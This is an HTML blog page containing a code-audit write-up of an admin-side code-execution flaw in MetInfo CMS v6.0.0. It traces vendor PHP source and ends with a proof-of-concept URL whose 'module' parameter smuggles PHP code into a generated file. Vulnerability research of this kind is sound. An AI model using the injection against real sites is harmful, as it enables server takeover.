@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Metinfo v6.0.0 getshell in background - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/06/Metinfo-v6-0-0-getshell-in-background/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#metinfo" title="metinfo">metinfo</a>
+                        
+                    </div>
+                    <h1>Metinfo v6.0.0 getshell in background</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-06-29
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Metinfo-v6-0-0-后台getshell"><a href="#Metinfo-v6-0-0-后台getshell" class="headerlink" title="Metinfo v6.0.0 后台getshell"></a>Metinfo v6.0.0 后台getshell</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞发生在<code>metinfo6\admin\column\save.php</code>约32行处的<code>column_copyconfig</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">'../login/login_check.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'global.func.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">"editor"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>($name==<span class="string">''</span>)metsave(<span class="string">'-1'</span>,$lang_js11);</span><br><span class="line">	<span class="keyword">if</span>($if_in==<span class="number">1</span> <span class="keyword">and</span> $out_url==<span class="string">''</span> <span class="keyword">and</span> $module&lt;<span class="number">1000</span>)metsave(<span class="string">'-1'</span>,$lang_modOuturl);</span><br><span class="line">	<span class="keyword">if</span>($module==<span class="number">1</span> &amp;&amp;$isshow==<span class="number">0</span> &amp;&amp; !($met_class2[$id]||$met_class3[$id]))metsave(<span class="string">'-1'</span>,$lang_columnerr8);</span><br><span class="line">	$filename=namefilter($filename);</span><br><span class="line">	$filenameold=namefilter($filenameold);</span><br><span class="line">	$indeximg =$metadmin[categorymarkimage]?$indeximg:<span class="string">''</span>;</span><br><span class="line">	$columnimg=$metadmin[categoryimage]?$columnimg:<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>($new_windows==<span class="number">0</span>)&#123;</span><br><span class="line">		$new_windows=<span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($new_windows==<span class="number">1</span>)&#123;</span><br><span class="line">		$new_windows=<span class="string">"target=''_blank''"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($if_in==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>($filename!=<span class="string">''</span> &amp;&amp; $filename!=$filenameold)&#123;</span><br><span class="line">			$filenameok = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'"</span>);</span><br><span class="line">			<span class="keyword">if</span>($filenameok)metsave(<span class="string">'-1'</span>,$lang_modFilenameok);</span><br><span class="line">			<span class="keyword">if</span>(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123;</span><br><span class="line">				$filenameok1 = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'"</span>);</span><br><span class="line">				<span class="keyword">if</span>($filenameok1)metsave(<span class="string">'-1'</span>,$lang_jsx30);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$filedir=<span class="string">"../../"</span>.$foldername;  </span><br><span class="line">		<span class="keyword">if</span>(!file_exists($filedir))@mkdir($filedir,<span class="number">0777</span>); 		</span><br><span class="line">		<span class="keyword">if</span>(!file_exists($filedir))metsave(<span class="string">'-1'</span>,$lang_modFiledir);</span><br><span class="line">		column_copyconfig($foldername,$module,$id);</span><br><span class="line">		<span class="keyword">if</span>($met_member_use)<span class="keyword">require_once</span> <span class="string">'check.php'</span>;</span><br><span class="line">		……</span><br></pre></td></tr></table></figure></p>
+<p>跟进这个函数看一下，在<code>metinfo6\admin\column\global.func.php</code>文件中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">column_copyconfig</span><span class="params">($foldername,$module,$id)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $anyid,$lang_columntip13,$lang,$db,$met_column;</span><br><span class="line">	<span class="keyword">switch</span>($module)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			$indexaddress =<span class="string">"../about/index.php"</span>;</span><br><span class="line">			$newfile  =ROOTPATH.$foldername.<span class="string">"/show.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../about/show.php"</span>;				</span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			$indexaddress =<span class="string">"../news/index.php"</span>;</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/news.php"</span>; </span><br><span class="line">			$address =<span class="string">"../news/news.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile); </span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/shownews.php"</span>; </span><br><span class="line">			$address  =<span class="string">"../news/shownews.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			$indexaddress =<span class="string">"../product/index.php"</span>;</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/product.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../product/product.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile); </span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/showproduct.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../product/showproduct.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			$indexaddress =<span class="string">"../download/index.php"</span>;</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/download.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../download/download.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile); </span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/showdownload.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../download/showdownload.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/down.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../download/down.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			$indexaddress =<span class="string">"../img/index.php"</span>;</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/img.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../img/img.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/showimg.php"</span>;  </span><br><span class="line">			$address  =<span class="string">"../img/showimg.php"</span>; </span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:  </span><br><span class="line">			$array[<span class="number">1</span>][<span class="number">0</span>]=<span class="string">'met_fd_time'</span>;</span><br><span class="line">			$array[<span class="number">1</span>][<span class="number">1</span>]=<span class="string">'120'</span>;</span><br><span class="line">			$array[<span class="number">2</span>][<span class="number">0</span>]=<span class="string">'met_fd_word'</span>;</span><br><span class="line">			$array[<span class="number">2</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">3</span>][<span class="number">0</span>]=<span class="string">'met_fd_email'</span>;</span><br><span class="line">			$array[<span class="number">3</span>][<span class="number">1</span>]=<span class="string">'0'</span>;</span><br><span class="line">			$array[<span class="number">4</span>][<span class="number">0</span>]=<span class="string">'met_fd_type'</span>;</span><br><span class="line">			$array[<span class="number">4</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">5</span>][<span class="number">0</span>]=<span class="string">'met_fd_to'</span>;</span><br><span class="line">			$array[<span class="number">5</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">6</span>][<span class="number">0</span>]=<span class="string">'met_fd_back'</span>;</span><br><span class="line">			$array[<span class="number">6</span>][<span class="number">1</span>]=<span class="string">'0'</span>;</span><br><span class="line">			$array[<span class="number">7</span>][<span class="number">0</span>]=<span class="string">'met_fd_title'</span>;</span><br><span class="line">			$array[<span class="number">7</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">8</span>][<span class="number">0</span>]=<span class="string">'met_fd_content'</span>;</span><br><span class="line">			$array[<span class="number">8</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">'met_fd_ok'</span>;</span><br><span class="line">			$array[<span class="number">9</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">10</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_back'</span>;</span><br><span class="line">			$array[<span class="number">10</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">11</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_content'</span>;</span><br><span class="line">			$array[<span class="number">11</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">12</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_dell'</span>;</span><br><span class="line">			$array[<span class="number">12</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">13</span>][<span class="number">0</span>]=<span class="string">'met_message_fd_class'</span>;</span><br><span class="line">			$array[<span class="number">13</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">14</span>][<span class="number">0</span>]=<span class="string">'met_message_fd_content'</span>;</span><br><span class="line">			$array[<span class="number">14</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">15</span>][<span class="number">0</span>]=<span class="string">'met_message_fd_email'</span>;</span><br><span class="line">			$array[<span class="number">15</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">16</span>][<span class="number">0</span>]=<span class="string">'met_message_fd_sms'</span>;</span><br><span class="line">			$array[<span class="number">16</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			verbconfig($array,$id);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:  </span><br><span class="line">			$indexaddress =<span class="string">"../feedback/index.php"</span>;</span><br><span class="line">			$newfile =ROOTPATH.$foldername.<span class="string">"/uploadfile_save.php"</span>;  </span><br><span class="line">			$address =<span class="string">"../feedback/uploadfile_save.php"</span>;</span><br><span class="line">			Copyfile($address,$newfile);</span><br><span class="line">			$array[<span class="number">1</span>][<span class="number">0</span>]=<span class="string">'met_fd_time'</span>;</span><br><span class="line">			$array[<span class="number">1</span>][<span class="number">1</span>]=<span class="string">'120'</span>;</span><br><span class="line">			$array[<span class="number">2</span>][<span class="number">0</span>]=<span class="string">'met_fd_word'</span>;</span><br><span class="line">			$array[<span class="number">2</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">3</span>][<span class="number">0</span>]=<span class="string">'met_fd_type'</span>;</span><br><span class="line">			$array[<span class="number">3</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">4</span>][<span class="number">0</span>]=<span class="string">'met_fd_to'</span>;</span><br><span class="line">			$array[<span class="number">4</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">5</span>][<span class="number">0</span>]=<span class="string">'met_fd_back'</span>;</span><br><span class="line">			$array[<span class="number">5</span>][<span class="number">1</span>]=<span class="string">'0'</span>;</span><br><span class="line">			$array[<span class="number">6</span>][<span class="number">0</span>]=<span class="string">'met_fd_email'</span>;</span><br><span class="line">			$array[<span class="number">6</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">7</span>][<span class="number">0</span>]=<span class="string">'met_fd_title'</span>;</span><br><span class="line">			$array[<span class="number">7</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">8</span>][<span class="number">0</span>]=<span class="string">'met_fd_content'</span>;</span><br><span class="line">			$array[<span class="number">8</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">'met_fdtable'</span>;</span><br><span class="line">			$fd_title=$db-&gt;get_one(<span class="string">"SELECT * FROM $met_column WHERE id='$id'"</span>);</span><br><span class="line">			$array[<span class="number">9</span>][<span class="number">1</span>]=$fd_title[<span class="string">'name'</span>];</span><br><span class="line">			$array[<span class="number">10</span>][<span class="number">0</span>]=<span class="string">'met_fd_class'</span>;</span><br><span class="line">			$array[<span class="number">10</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">11</span>][<span class="number">0</span>]=<span class="string">'met_fd_ok'</span>;</span><br><span class="line">			$array[<span class="number">11</span>][<span class="number">1</span>]=<span class="string">'1'</span>;</span><br><span class="line">			$array[<span class="number">12</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_back'</span>;</span><br><span class="line">			$array[<span class="number">12</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">13</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_content'</span>;</span><br><span class="line">			$array[<span class="number">13</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			$array[<span class="number">14</span>][<span class="number">0</span>]=<span class="string">'met_fd_sms_dell'</span>;</span><br><span class="line">			$array[<span class="number">14</span>][<span class="number">1</span>]=<span class="string">''</span>;</span><br><span class="line">			verbconfig($array,$id);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Copyindx(ROOTPATH.$foldername.<span class="string">'/index.php'</span>,$module);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>中间的switch部分可以跳过，可以直接来到<code>Copyindx</code>函数，这是个文件备份写入的函数<br>跟进这个函数,大约在<code>metinfo6\admin\include\global.func.php</code>884行附件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*复制首页*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">		$oldcont =<span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">		$fp = fopen($newindx,w);</span><br><span class="line">		fputs($fp, $oldcont);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里将$type变量直接写入了文件中，而$type变量一直可以追溯到<code>column_copyconfig</code>的$module变量<br>根据<code>metinfo6\admin\include\common.inc.php</code>中的伪全局变量覆盖，大约在77行左右<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">		$_M[<span class="string">'form'</span>][$_key]=daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>就可以通过传入get参数，覆盖$module变量，导致任意文件写入</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>先进行管理员登录之后<br>传入如下poc<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/metinfo6/admin/column/save.php?</span></span><br><span class="line">name=<span class="number">123</span></span><br><span class="line"><span class="variable">&amp;action</span>=editor</span><br><span class="line"><span class="variable">&amp;foldername</span>=upload</span><br><span class="line"><span class="variable">&amp;module</span>=<span class="number">22</span>;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
+<p>就会在upload目录下生成phpinfo页面。<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Metinfo-v6-0-0-getshell-in-background/1.png" alt>  </p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/07/随笔-7-3/" data-toggle="tooltip" data-placement="top" title="随笔-7.3">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/06/Flask-Jinja2-SSTI-python-沙箱逃逸/" data-toggle="tooltip" data-placement="top" title="Flask/Jinja2 SSTI && python 沙箱逃逸">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#metinfo" title="metinfo">metinfo</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
